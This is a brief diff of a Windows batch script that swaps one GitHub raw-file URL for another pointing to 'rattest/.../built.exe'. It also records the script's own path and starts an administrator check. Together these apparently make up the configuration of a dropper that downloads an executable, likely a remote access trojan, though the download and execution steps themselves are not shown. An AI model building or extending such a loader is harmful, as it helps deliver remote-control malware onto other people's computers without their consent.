@@ -4,7 +4,7 @@ setlocal EnableExtensions DisableDelayedExpansion
 rem CONFIGURATION
 rem Double any literal percent signs in URLs inside this batch file.
 set "release=true"
-set "EXE_URL=https://github.com/Angxuz/testtttttting/raw/refs/heads/main/built%%20(1).exe"
+set "EXE_URL=https://github.com/Angxuz/rattest/raw/refs/heads/main/built.exe"
 set "SELF_PATH=%~f0"
 
 rem Check whether this process has administrator privileges.
